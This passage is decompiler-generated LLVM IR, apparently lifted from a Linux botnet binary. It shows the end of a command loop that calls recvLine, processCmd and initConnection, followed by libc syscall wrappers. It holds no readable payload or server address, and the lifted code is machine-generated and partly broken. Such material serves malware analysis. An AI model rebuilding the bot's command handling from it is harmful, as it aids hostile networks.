  %v0_805132e = load i32, i32* @esp, align 4
  %v1_805132e = add i32 %v0_805132e, 16
  %v4_8051331 = add i32 %stack_var_-40.274, 1
  br label %dec_label_pc_8051334

dec_label_pc_8051334:                             ; preds = %dec_label_pc_80512ae, %dec_label_pc_80512b7
  %v0_8051334 = phi i32 [ %v0_805133499, %dec_label_pc_80512ae ], [ %v1_805132e, %dec_label_pc_80512b7 ]
  %stack_var_-40.1 = phi i32 [ %stack_var_-40.274, %dec_label_pc_80512ae ], [ %v4_8051331, %dec_label_pc_80512b7 ]
  %v1_8051337 = add i32 %v0_8051334, -12
  %v2_8051337 = inttoptr i32 %v1_8051337 to i32*
  store i32 ptrtoint (i32* @global_var_805c9db.914 to i32), i32* %v2_8051337, align 4
  %v1_805133c = add i32 %v0_8051334, -16
  %v2_805133c = inttoptr i32 %v1_805133c to i32*
  store i32 0, i32* %v2_805133c, align 4
  %v1_805133e = load i8*, i8** %stack_var_-36, align 4
  %v2_805133e = ptrtoint i8* %v1_805133e to i32
  %v3_805133e = call i32 @__GI_strtok(i32 %stack_var_-40.1, i32 %v2_805133e)
  store i32 %v3_805133e, i32* %eax.global-to-local, align 4
  %v0_8051343 = load i32, i32* @esp, align 4
  %v1_8051343 = add i32 %v0_8051343, 16
  store i32 %v3_805133e, i32* %tmp173, align 4
  %v5_8051349 = icmp eq i32 %v3_805133e, 0
  %v1_805134d = icmp eq i1 %v5_8051349, false
  %tmp175 = inttoptr i32 %v3_805133e to i8*
  br i1 %v1_805134d, label %dec_label_pc_80512ae, label %dec_label_pc_8051353

dec_label_pc_8051353:                             ; preds = %dec_label_pc_8051334, %dec_label_pc_8051285
  %v0_8051353 = phi i32 [ %v1_805129d, %dec_label_pc_8051285 ], [ %v1_8051343, %dec_label_pc_8051334 ]
  %stack_var_-40.2.lcssa = phi i32 [ 1, %dec_label_pc_8051285 ], [ %stack_var_-40.1, %dec_label_pc_8051334 ]
  store i32 %v2_8051356, i32* %eax.global-to-local, align 4
  %v2_8051359 = add i32 %v0_8051353, -12
  %v3_8051359 = inttoptr i32 %v2_8051359 to i32*
  store i32 %v2_8051356, i32* %v3_8051359, align 4
  %v5_805135a = add i32 %v0_8051353, -16
  %v6_805135a = inttoptr i32 %v5_805135a to i32*
  store i32 %stack_var_-40.2.lcssa, i32* %v6_805135a, align 4
  %v0_805135d = call i32 @processCmd()
  store i32 %v0_805135d, i32* %eax.global-to-local, align 4
  %v0_8051362 = load i32, i32* @esp, align 4
  %v1_8051362 = add i32 %v0_8051362, 16
  %v7_8051369 = icmp sgt i32 %stack_var_-40.2.lcssa, 1
  br i1 %v7_8051369, label %dec_label_pc_805137b.lr.ph, label %dec_label_pc_8051399.outer29

dec_label_pc_805137b.lr.ph:                       ; preds = %dec_label_pc_8051353
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805137b

dec_label_pc_805137b:                             ; preds = %dec_label_pc_805137b.lr.ph, %dec_label_pc_805137b
  %storemerge238 = phi i32 [ 1, %dec_label_pc_805137b.lr.ph ], [ %v4_805138e, %dec_label_pc_805137b ]
  %v0_8051382237 = phi i32 [ %v1_8051362, %dec_label_pc_805137b.lr.ph ], [ %v1_805138b, %dec_label_pc_805137b ]
  store i32 %storemerge238, i32* %eax.global-to-local, align 4
  %v0_805137e = load i32, i32* @ebp, align 4
  %v2_805137e = mul i32 %storemerge238, 4
  %v3_805137e = add i32 %v2_805137e, -124
  %v4_805137e = add i32 %v3_805137e, %v0_805137e
  %v5_805137e = inttoptr i32 %v4_805137e to i32*
  %v6_805137e = load i32, i32* %v5_805137e, align 4
  store i32 %v6_805137e, i32* %eax.global-to-local, align 4
  %v2_8051385 = add i32 %v0_8051382237, -16
  %v3_8051385 = inttoptr i32 %v2_8051385 to i32*
  store i32 %v6_805137e, i32* %v3_8051385, align 4
  %v1_8051386 = call i32 @free(i32 %storemerge238)
  %v0_805138b = load i32, i32* @esp, align 4
  %v1_805138b = add i32 %v0_805138b, 16
  %v4_805138e = add nuw nsw i32 %storemerge238, 1
  store i32 %v4_805138e, i32* %eax.global-to-local, align 4
  %v5_8051397 = icmp slt i32 %v4_805138e, %stack_var_-40.2.lcssa
  br i1 %v5_8051397, label %dec_label_pc_805137b, label %dec_label_pc_8051399.outer

dec_label_pc_8051399.outer:                       ; preds = %dec_label_pc_805137b, %dec_label_pc_8050d81
  %v0_80513a5.pre108 = phi i32 [ %v1_8050db4, %dec_label_pc_8050d81 ], [ %v1_805138b, %dec_label_pc_805137b ]
  %stack_var_-28.1.ph = phi i32 [ %stack_var_-28.0.ph, %dec_label_pc_8050d81 ], [ %v4_805138e, %dec_label_pc_805137b ]
  %stack_var_-40.3.ph = phi i32 [ %stack_var_-40.0.ph, %dec_label_pc_8050d81 ], [ %stack_var_-40.2.lcssa, %dec_label_pc_805137b ]
  %stack_var_-32.2.ph = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_8050d81 ], [ %stack_var_-32.1, %dec_label_pc_805137b ]
  %stack_var_-64.2.ph = phi i8* [ %stack_var_-64.0.ph, %dec_label_pc_8050d81 ], [ %v22_8051172, %dec_label_pc_805137b ]
  %stack_var_-60.3.ph = phi i32 [ %stack_var_-60.0.ph, %dec_label_pc_8050d81 ], [ %stack_var_-60.2, %dec_label_pc_805137b ]
  br label %dec_label_pc_8051399.outer29

dec_label_pc_8051399.outer29:                     ; preds = %dec_label_pc_8051399.outer, %dec_label_pc_8051353
  %v0_80513a5.pre107 = phi i32 [ %v0_80513a5.pre108, %dec_label_pc_8051399.outer ], [ %v1_8051362, %dec_label_pc_8051353 ]
  %stack_var_-40.3.ph30 = phi i32 [ %stack_var_-40.3.ph, %dec_label_pc_8051399.outer ], [ %stack_var_-40.2.lcssa, %dec_label_pc_8051353 ]
  %stack_var_-32.2.ph31 = phi i32 [ %stack_var_-32.2.ph, %dec_label_pc_8051399.outer ], [ %stack_var_-32.1, %dec_label_pc_8051353 ]
  %stack_var_-64.2.ph32 = phi i8* [ %stack_var_-64.2.ph, %dec_label_pc_8051399.outer ], [ %v22_8051172, %dec_label_pc_8051353 ]
  %stack_var_-60.3.ph33 = phi i32 [ %stack_var_-60.3.ph, %dec_label_pc_8051399.outer ], [ %stack_var_-60.2, %dec_label_pc_8051353 ]
  br label %dec_label_pc_8051399.outer34

dec_label_pc_8051399.outer34:                     ; preds = %dec_label_pc_8051399.outer34.backedge, %dec_label_pc_8051399.outer29
  %v0_80513a5.pre = phi i32 [ %v0_80513a5.pre107, %dec_label_pc_8051399.outer29 ], [ %v0_80513a5.pre.pre, %dec_label_pc_8051399.outer34.backedge ]
  %stack_var_-64.2.ph35 = phi i8* [ %stack_var_-64.2.ph32, %dec_label_pc_8051399.outer29 ], [ %stack_var_-64.2.ph35.be, %dec_label_pc_8051399.outer34.backedge ]
  %stack_var_-60.3.ph36 = phi i32 [ %stack_var_-60.3.ph33, %dec_label_pc_8051399.outer29 ], [ %stack_var_-60.2, %dec_label_pc_8051399.outer34.backedge ]
  %v2_8050df0 = ptrtoint i8* %stack_var_-64.2.ph35 to i32
  br label %dec_label_pc_8051399

dec_label_pc_8051399:                             ; preds = %dec_label_pc_8051399.outer34, %dec_label_pc_805101b
  %v0_80513a5 = phi i32 [ %v1_805102e, %dec_label_pc_805101b ], [ %v0_80513a5.pre, %dec_label_pc_8051399.outer34 ]
  %stack_var_-60.3 = phi i32 [ %stack_var_-60.2, %dec_label_pc_805101b ], [ %stack_var_-60.3.ph36, %dec_label_pc_8051399.outer34 ]
  store i32 %v2_8051399, i32* %eax.global-to-local, align 4
  %v0_805139f = load i32, i32* @global_var_805f8c0.20, align 64
  store i32 %v0_805139f, i32* %edx.global-to-local, align 4
  %v1_80513a8 = add i32 %v0_80513a5, -8
  %v2_80513a8 = inttoptr i32 %v1_80513a8 to i32*
  store i32 4096, i32* %v2_80513a8, align 4
  %v2_80513ad = add i32 %v0_80513a5, -12
  %v3_80513ad = inttoptr i32 %v2_80513ad to i32*
  store i32 %v2_8051399, i32* %v3_80513ad, align 4
  %v0_80513ae = load i32, i32* %edx.global-to-local, align 4
  %v2_80513ae = add i32 %v0_80513a5, -16
  %v3_80513ae = inttoptr i32 %v2_80513ae to i32*
  store i32 %v0_80513ae, i32* %v3_80513ae, align 4
  %v0_80513af = call i32 @recvLine()
  store i32 %v0_80513af, i32* %eax.global-to-local, align 4
  %v0_80513b4 = load i32, i32* @esp, align 4
  %v13_80513ba = icmp eq i32 %v0_80513af, -1
  %v1_80513be = icmp eq i1 %v13_80513ba, false
  br i1 %v1_80513be, label %dec_label_pc_8050f7e, label %dec_label_pc_8050d69.outer

; uselistorder directives
  uselistorder i32 %v0_80513af, { 0, 2, 1 }
  uselistorder i32 %stack_var_-60.3, { 1, 0 }
  uselistorder i32 %v0_80513a5, { 2, 1, 0 }
  uselistorder i8* %stack_var_-64.2.ph35, { 1, 0 }
  uselistorder i32 %stack_var_-32.2.ph31, { 1, 2, 0 }
  uselistorder i32 %stack_var_-28.1.ph, { 0, 2, 1 }
  uselistorder i32 %v4_805138e, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge238, { 3, 2, 0, 1 }
  uselistorder i32 %v1_8051362, { 1, 0 }
  uselistorder i32 %stack_var_-40.2.lcssa, { 4, 0, 1, 3, 2 }
  uselistorder i32 %v0_8051353, { 1, 0 }
  uselistorder i32 %v3_805133e, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-40.1, { 0, 2, 1 }
  uselistorder i32 %v0_8051334, { 1, 0 }
  uselistorder i32 %v1_8051304, { 1, 0 }
  uselistorder i32 %v1_80512d5, { 1, 0 }
  uselistorder i32 %v5_80512b1, { 1, 0 }
  uselistorder i32 %v4_80512ae, { 2, 1, 0, 3, 4 }
  uselistorder i32 %stack_var_-40.274, { 0, 5, 4, 2, 3, 1 }
  uselistorder i8* %v3_80512ba, { 2, 0, 1 }
  uselistorder i32 %v1_805129d, { 1, 0 }
  uselistorder i32 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %storemerge26.in.in, { 2, 1, 0 }
  uselistorder i32 %v0_8051207, { 0, 1, 2, 5, 6, 3, 4, 7 }
  uselistorder i8* %v22_8051172, { 1, 0, 2 }
  uselistorder i8* %v22_805119a, { 0, 2, 1 }
  uselistorder i32 %v5_805119a, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_805118b, { 1, 0 }
  uselistorder i8* %storemerge17230, { 1, 0 }
  uselistorder i32 %v4_805119d231, { 2, 1, 0 }
  uselistorder i32 %v1_805110d, { 3, 1, 0, 2, 4, 6, 5 }
  uselistorder i8* %v5_80510d5, { 4, 7, 0, 1, 5, 2, 3, 6, 8, 10, 9 }
  uselistorder i32 %v1_80510d2, { 6, 9, 2, 3, 7, 4, 5, 8, 10, 11, 1, 0, 12, 13, 14 }
  uselistorder i8* %storemerge18.lcssa, { 1, 0 }
  uselistorder i32 %v5_8051082, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_805100c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8050f92, { 1, 0, 2 }
  uselistorder i32 %storemerge19, { 2, 4, 0, 3, 1 }
  uselistorder i32 %stack_var_-60.2, { 3, 1, 2, 0, 5, 4 }
  uselistorder i32 %v0_8050de8.in, { 2, 1, 0 }
  uselistorder i32 %v0_8050f21, { 1, 0, 2 }
  uselistorder i32 %storemerge20, { 1, 0, 2 }
  uselistorder i32 %v2_8050eee, { 2, 0, 1 }
  uselistorder i32 %v1_8050ed7, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8050ea2, { 1, 0 }
  uselistorder i32 %v0_8050e47, { 1, 0, 2 }
  uselistorder i32 %storemerge21, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v2_8050e16, { 1, 0, 2 }
  uselistorder i32 %.pre, { 0, 2, 1 }
  uselistorder i32 %v2_8050dd9, { 1, 0 }
  uselistorder i8* %storemerge18194, { 2, 0, 1, 3 }
  uselistorder i32 %v5_805106f, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v2_80511c0, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %v2_8051399, { 13, 14, 0, 1, 5, 6, 7, 2, 8, 9, 10, 11, 12, 3, 4 }
  uselistorder i32 %v1_8050cf9, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8050cc7, { 1, 0, 2 }
  uselistorder i32 %v2_8050c8b, { 1, 0, 2 }
  uselistorder i32 %v2_8050bae, { 0, 2, 1 }
  uselistorder i8** %stack_var_-5360, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-5376, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i8** %stack_var_-132, { 1, 0 }
  uselistorder i8** %stack_var_-36, { 5, 2, 1, 6, 3, 4, 0 }
  uselistorder i32* %edx.global-to-local, { 12, 13, 0, 1, 2, 3, 4, 11, 6, 5, 7, 9, 8, 10, 14, 15, 16, 17 }
  uselistorder i32* %eax.global-to-local, { 80, 81, 2, 0, 1, 122, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 19, 20, 15, 16, 17, 18, 21, 22, 23, 24, 26, 27, 28, 29, 32, 33, 30, 31, 121, 120, 34, 35, 36, 37, 119, 118, 38, 39, 40, 43, 44, 45, 41, 42, 46, 47, 48, 49, 50, 51, 52, 53, 117, 116, 54, 55, 56, 57, 59, 60, 58, 61, 62, 79, 63, 64, 67, 65, 66, 68, 69, 70, 73, 71, 72, 74, 75, 76, 77, 78, 82, 83, 84, 86, 85, 25, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0, 5, 4 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @szprintf, { 210, 209, 208, 207, 206, 205, 204, 203, 202, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27 }
  uselistorder i32 ()* @listFork, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0, 5, 4 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_8058777.21 to i32), { 2, 1, 0 }
  uselistorder i32 ()* @trim, { 1, 0 }
  uselistorder i32 (i32, i32)* @HackerPrint, { 15, 14, 1, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 17, 16, 0 }
  uselistorder i32 (i32)* @sleep, { 3, 2, 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 4, 3, 0, 2, 1 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 2, 3, 4, 5, 6, 7, 8, 28, 29 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_8065b48.232, { 4, 0, 3, 2, 1 }
  uselistorder i32 ()* @getBuild, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051399.outer34, { 1, 0 }
  uselistorder label %dec_label_pc_805137b, { 1, 0 }
  uselistorder label %dec_label_pc_8051334, { 1, 0 }
  uselistorder label %dec_label_pc_80512ae, { 1, 0 }
  uselistorder label %dec_label_pc_8051285, { 1, 0 }
  uselistorder label %dec_label_pc_805124f, { 1, 0 }
  uselistorder label %dec_label_pc_805117d, { 1, 0 }
  uselistorder label %dec_label_pc_805116c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051163, { 1, 0 }
  uselistorder label %dec_label_pc_80510ff, { 1, 0 }
  uselistorder label %dec_label_pc_8051097, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805108e, { 1, 0 }
  uselistorder label %dec_label_pc_8051399.outer34.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051063, { 1, 0 }
  uselistorder label %dec_label_pc_8050f7b, { 1, 0 }
  uselistorder label %dec_label_pc_8050f0d, { 1, 0 }
  uselistorder label %dec_label_pc_8050eeb, { 1, 0 }
  uselistorder label %dec_label_pc_8050e33, { 1, 0 }
  uselistorder label %dec_label_pc_8050e09, { 1, 0 }
  uselistorder label %dec_label_pc_8050d72, { 1, 0 }
  uselistorder label %dec_label_pc_8050d43, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050c0b, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80513d2 = call i32 @vfork()
  %v5_80513d5 = icmp ult i32 %v0_80513d2, -4095
  %v1_80513da = icmp eq i1 %v5_80513d5, false
  call void @__pseudo_cond_branch(i1 %v1_80513da, i32 134565220)
  ret i32 %v0_80513d2
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80513e4 = load i32, i32* @edi, align 4
  %v0_80513e5 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80513f9 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_8051403 = icmp ugt i32 %v1_80513f9, 2
  br i1 %v6_8051403, label %dec_label_pc_8051413, label %dec_label_pc_8051405

dec_label_pc_8051405:                             ; preds = %entry
  %v4_8051409 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_80513f9)
  br label %dec_label_pc_8051435

dec_label_pc_8051413:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_805141b = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_805141b, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_805141b, -4095
  br i1 %tmp17, label %dec_label_pc_8051433, label %dec_label_pc_8051427

dec_label_pc_8051427:                             ; preds = %dec_label_pc_8051413
  %v1_8051427 = call i32 @__errno_location(i32 %v0_80513e5)
  %v0_805142c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805142c = sub i32 0, %v0_805142c
  %v2_805142e = inttoptr i32 %v1_8051427 to i32*
  store i32 %v1_805142c, i32* %v2_805142e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051433

dec_label_pc_8051433:                             ; preds = %dec_label_pc_8051413, %dec_label_pc_8051427
  %v0_8051433 = phi i32 [ %v2_805141b, %dec_label_pc_8051413 ], [ -1, %dec_label_pc_8051427 ]
  br label %dec_label_pc_8051435

dec_label_pc_8051435:                             ; preds = %dec_label_pc_8051405, %dec_label_pc_8051433
  %v0_805143a = phi i32 [ %v4_8051409, %dec_label_pc_8051405 ], [ %v0_8051433, %dec_label_pc_8051433 ]
  store i32 %v0_80513e5, i32* @ebx, align 4
  store i32 %v0_80513e4, i32* @edi, align 4
  ret i32 %v0_805143a

; uselistorder directives
  uselistorder i32 %v2_805141b, { 1, 0, 2 }
  uselistorder i32 %v0_80513e5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8051435, { 1, 0 }
  uselistorder label %dec_label_pc_8051433, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805143c = load i32, i32* @edi, align 4
  store i32 %v0_805143c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_8051454 = load i32, i32* @ebx, align 4
  %v1_805145c = call i32 @int80_syscall(i32 221)
  store i32 %v1_805145c, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_805145c, -4095
  br i1 %tmp11, label %dec_label_pc_8051474, label %dec_label_pc_8051468

dec_label_pc_8051468:                             ; preds = %entry
  %v1_8051468 = call i32 @__errno_location(i32 %v0_8051454)
  %v0_805146d = load i32, i32* %edi.global-to-local, align 4
  %v1_805146d = sub i32 0, %v0_805146d
  %v2_805146f = inttoptr i32 %v1_8051468 to i32*
  store i32 %v1_805146d, i32* %v2_805146f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051474

dec_label_pc_8051474:                             ; preds = %entry, %dec_label_pc_8051468
  %v0_8051474 = phi i32 [ %v1_805145c, %entry ], [ -1, %dec_label_pc_8051468 ]
  %v2_8051479 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051479, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051474

; uselistorder directives
  uselistorder i32 %v1_805145c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051474, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @access(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80514a4 = load i32, i32* @ebx, align 4
  store i32 %v0_80514a4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_80514b7 = call i32 @access(i32 %v0_80514a4, i32 %tmp4)
  store i32 %v2_80514b7, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_80514b7, -4095
  br i1 %tmp8, label %dec_label_pc_80514d0, label %dec_label_pc_80514c4

dec_label_pc_80514c4:                             ; preds = %entry
  %v0_80514c4 = load i32, i32* %stack_var_-4, align 4
  %v1_80514c4 = call i32 @__errno_location(i32 %v0_80514c4)
  %v0_80514c9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80514c9 = sub i32 0, %v0_80514c9
  %v2_80514cb = inttoptr i32 %v1_80514c4 to i32*
  store i32 %v1_80514c9, i32* %v2_80514cb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80514d0

dec_label_pc_80514d0:                             ; preds = %entry, %dec_label_pc_80514c4
  %v0_80514d0 = phi i32 [ %v2_80514b7, %entry ], [ -1, %dec_label_pc_80514c4 ]
  %v2_80514d4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80514d4, i32* @ebx, align 4
  ret i32 %v0_80514d0

; uselistorder directives
  uselistorder i32 %v2_80514b7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @access, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80514d0, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80514d8 = load i32, i32* @edi, align 4
  store i32 %v0_80514d8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_80514e0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80514e8 = call i32 @chdir(i32 %v0_80514e0)
  store i32 %v0_80514e0, i32* @ebx, align 4
  store i32 %v1_80514e8, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_80514e8, -4095
  br i1 %tmp8, label %dec_label_pc_8051500, label %dec_label_pc_80514f4

dec_label_pc_80514f4:                             ; preds = %entry
  %v1_80514f4 = call i32 @__errno_location(i32 %v0_80514e0)
  %v0_80514f9 = load i32, i32* %edi.global-to-local, align 4
  %v1_80514f9 = sub i32 0, %v0_80514f9
  %v2_80514fb = inttoptr i32 %v1_80514f4 to i32*
  store i32 %v1_80514f9, i32* %v2_80514fb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051500

dec_label_pc_8051500:                             ; preds = %entry, %dec_label_pc_80514f4
  %v0_8051500 = phi i32 [ %v1_80514e8, %entry ], [ -1, %dec_label_pc_80514f4 ]
  %v2_8051502 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051502, i32* @edx, align 4
  %v2_8051504 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051504, i32* @edi, align 4
  ret i32 %v0_8051500

; uselistorder directives
  uselistorder i32 %v1_80514e8, { 1, 0, 2 }
  uselistorder i32 %v0_80514e0, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051500, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051508 = load i32, i32* @edi, align 4
  store i32 %v0_8051508, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051510 = load i32, i32* @ebx, align 4
  %v1_8051518 = call i32 @close(i32 %arg1)
  store i32 %v0_8051510, i32* @ebx, align 4
  store i32 %v1_8051518, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_8051518, -4095
  br i1 %tmp8, label %dec_label_pc_8051530, label %dec_label_pc_8051524

dec_label_pc_8051524:                             ; preds = %entry
  %v1_8051524 = call i32 @__errno_location(i32 %v0_8051510)
  %v0_8051529 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051529 = sub i32 0, %v0_8051529
  %v2_805152b = inttoptr i32 %v1_8051524 to i32*
  store i32 %v1_8051529, i32* %v2_805152b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051530

dec_label_pc_8051530:                             ; preds = %entry, %dec_label_pc_8051524
  %v0_8051530 = phi i32 [ %v1_8051518, %entry ], [ -1, %dec_label_pc_8051524 ]
  %v2_8051534 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051534, i32* @edi, align 4
  ret i32 %v0_8051530

; uselistorder directives
  uselistorder i32 %v1_8051518, { 1, 0, 2 }
  uselistorder i32 %v0_8051510, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051530, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051538 = load i32, i32* @ebx, align 4
  store i32 %v0_8051538, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805154b = call i32 @dup2(i32 %v0_8051538, i32 %tmp4)
  store i32 %v2_805154b, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_805154b, -4095
  br i1 %tmp8, label %dec_label_pc_8051564, label %dec_label_pc_8051558

dec_label_pc_8051558:                             ; preds = %entry
  %v0_8051558 = load i32, i32* %stack_var_-4, align 4
  %v1_8051558 = call i32 @__errno_location(i32 %v0_8051558)
  %v0_805155d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805155d = sub i32 0, %v0_805155d
  %v2_805155f = inttoptr i32 %v1_8051558 to i32*
  store i32 %v1_805155d, i32* %v2_805155f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051564

dec_label_pc_8051564:                             ; preds = %entry, %dec_label_pc_8051558
  %v0_8051564 = phi i32 [ %v2_805154b, %entry ], [ -1, %dec_label_pc_8051558 ]
  %v2_8051568 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051568, i32* @ebx, align 4
  ret i32 %v0_8051564

; uselistorder directives
  uselistorder i32 %v2_805154b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
